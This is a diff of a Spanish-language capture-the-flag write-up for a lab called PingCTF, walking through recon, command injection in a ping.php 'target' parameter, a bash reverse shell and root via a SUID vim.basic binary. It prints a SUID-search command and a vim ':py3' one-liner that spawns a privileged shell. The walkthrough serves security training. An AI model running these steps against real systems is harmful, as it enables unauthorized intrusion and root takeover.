@@ -1,47 +1,55 @@
-## Fase de Reconocimiento y Descubrimiento (Enumeración)
+# PingCTF
 
-### Escaneo de Puertos (Nmap)
+### Fase de Reconocimiento y Descubrimiento (Enumeración)
+
+#### Escaneo de Puertos (Nmap)
+
 Realizamos un escaneo de puertos inicial con nmap para identificar los servicios activos en la máquina objetivo:
 
-![Pasted image 20260810221137.png](../../../assets/Pasted%20image%2020260810221137.png)
+![Pasted image 20260810221137.png](<../../../.gitbook/assets/Pasted image 20260810221137.png>)
 
 **Servicios identificados:**
-* **Puerto 80/TCP (HTTP):** Servidor web expuesto. Ver teoría en [HTTP & HTTPS.md](../../../Pentesting%20Notes/1_Enumeration/HTTP%20%26%20HTTPS.md).
 
----
+* **Puerto 80/TCP (HTTP):** Servidor web expuesto. Ver teoría en [HTTP & HTTPS.md](<../../../Pentesting Notes/1_Enumeration/HTTP & HTTPS.md>).
 
-## Enumeración Web
+***
 
-### Inspección del Servidor Web (WhatWeb)
+### Enumeración Web
+
+#### Inspección del Servidor Web (WhatWeb)
+
 Analizamos las tecnologías y cabeceras del servidor web mediante whatweb:
 
-![Pasted image 20260810221206.png](../../../assets/Pasted%20image%2020260810221206.png)
+![Pasted image 20260810221206.png](<../../../.gitbook/assets/Pasted image 20260810221206.png>)
 
 Identificamos un servidor web Apache. Accedemos a la aplicación a través del navegador:
 
-![Pasted image 20260810221253.png](../../../assets/Pasted%20image%2020260810221253.png)
+![Pasted image 20260810221253.png](<../../../.gitbook/assets/Pasted image 20260810221253.png>)
 
 * **Hallazgo:** La web presenta una utilidad para verificar la conectividad de red mediante la herramienta `ping`. Al ingresar una dirección IP y enviar el formulario, se genera una petición GET hacia `http://172.17.0.2/ping.php?target=IP`.
 
-### Fuzzing de Directorios
+#### Fuzzing de Directorios
+
 Realizamos un proceso de fuzzing web para descartar rutas o archivos ocultos en el servidor:
 
-![Pasted image 20260810221831.png](../../../assets/Pasted%20image%2020260810221831.png)
+![Pasted image 20260810221831.png](<../../../.gitbook/assets/Pasted image 20260810221831.png>)
 
 No se identifican rutas adicionales de interés salvo respuestas de redirección estándar (código 301), por lo que centramos nuestra atención en el funcionamiento del parámetro `target` en `ping.php`.
 
----
+***
 
-## Fase de Explotación / Intrusión
+### Fase de Explotación / Intrusión
 
-### Inyección de Comandos (Command Injection)
+#### Inyección de Comandos (Command Injection)
+
 Interceptamos la petición con Burp Suite y probamos delimitadores de comandos del sistema operativo (como `;`, `|`, `&&`) en el parámetro `target` para evaluar si los datos de entrada se concatenan directamente en la ejecución de comandos del sistema:
 
-![Pasted image 20260810222150.png](../../../assets/Pasted%20image%2020260810222150.png)
+![Pasted image 20260810222150.png](<../../../.gitbook/assets/Pasted image 20260810222150.png>)
 
 * **Vulnerabilidad:** El servidor ejecuta el comando inyectado y refleja su salida en la respuesta web, confirmando la vulnerabilidad de **Inyección de Comandos (Command Injection)** bajo el contexto del usuario `www-data`.
 
-### Reverse Shell y Tratamiento de la TTY
+#### Reverse Shell y Tratamiento de la TTY
+
 Preparamos una petición con un payload de reverse shell en bash debidamente codificado en URL (URL-encoding) dirigida a nuestro puerto local a la escucha:
 
 ```http
@@ -59,7 +67,7 @@ Priority: u=0, i
 
 Recibimos la conexión inversa en nuestro listener de Netcat:
 
-![Pasted image 20260810222344.png](../../../assets/Pasted%20image%2020260810222344.png)
+![Pasted image 20260810222344.png](<../../../.gitbook/assets/Pasted image 20260810222344.png>)
 
 Realizamos el tratamiento clásico de la TTY para obtener una consola completamente interactiva y estable:
 
@@ -74,22 +82,24 @@ stty rows 29 columns 111
 
 Obtenemos acceso como el usuario de bajos privilegios `www-data`.
 
----
+***
 
-## Escalada de Privilegios
+### Escalada de Privilegios
 
-### Enumeración de Binarios SUID
+#### Enumeración de Binarios SUID
+
 Listamos los binarios del sistema que cuentan con el bit SUID activo:
 
 ```bash
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-![Pasted image 20260810223320.png](../../../assets/Pasted%20image%2020260810223320.png)
+![Pasted image 20260810223320.png](<../../../.gitbook/assets/Pasted image 20260810223320.png>)
 
-* **Vulnerabilidad de Configuración:** Detectamos que el binario `/usr/bin/vim.basic` tiene habilitado el bit SUID. Ver teoría en [Permissions.md](../../../Pentesting%20Notes/3_Post-Explotation/Linux%20Privilage%20Escalation/Permissions.md).
+* **Vulnerabilidad de Configuración:** Detectamos que el binario `/usr/bin/vim.basic` tiene habilitado el bit SUID. Ver teoría en [Permissions.md](<../../../Pentesting Notes/3_Post-Explotation/Linux Privilage Escalation/Permissions.md>).
 
-### Explotación de SUID (vim.basic)
+#### Explotación de SUID (vim.basic)
+
 Dado que `vim.basic` cuenta con soporte para Python3 (`:py3`), podemos abusar de esta funcionalidad para ejecutar llamadas del sistema y spawnear una shell como superusuario.
 
 Ejecutamos el comando de elevación de privilegios:
@@ -104,12 +114,13 @@ Alternativamente, forzando el modo privilegiado de bash:
 vim.basic -c ':py3 import os; os.execl("/bin/bash","bash","-p")'
 ```
 
-![Pasted image 20260810223729.png](../../../assets/Pasted%20image%2020260810223729.png)
+![Pasted image 20260810223729.png](<../../../.gitbook/assets/Pasted image 20260810223729.png>)
 
 ¡Elevamos privilegios con éxito y obtenemos una sesión interactiva como el usuario **root**!
 
----
+***
 
-## Relaciones y Conceptos
-* **Teoría:** [Linux Privilege Escalation - Permissions.md](../../../Pentesting%20Notes/3_Post-Explotation/Linux%20Privilage%20Escalation/Permissions.md), [HTTP & HTTPS.md](../../../Pentesting%20Notes/1_Enumeration/HTTP%20%26%20HTTPS.md)
-* **Laboratorios Relacionados:** [Gotham](../../../Laboratorios/DockerLabs/Facil/Gotham.md) (Comparte inyección de comandos en utilidad de ping), [WalkingDead](../../../Laboratorios/DockerLabs/Facil/WalkingDead.md) (Comparte vector RCE y escalada por SUID), [Aguademayo](../../../Laboratorios/DockerLabs/Facil/Aguademayo.md) (Comparte explotación de binarios SUID)
+### Relaciones y Conceptos
+
+* **Teoría:** [Linux Privilege Escalation - Permissions.md](<../../../Pentesting Notes/3_Post-Explotation/Linux Privilage Escalation/Permissions.md>), [HTTP & HTTPS.md](<../../../Pentesting Notes/1_Enumeration/HTTP & HTTPS.md>)
+* **Laboratorios Relacionados:** [Gotham](Gotham.md) (Comparte inyección de comandos en utilidad de ping), [WalkingDead](WalkingDead.md) (Comparte vector RCE y escalada por SUID), [Aguademayo](Aguademayo.md) (Comparte explotación de binarios SUID)
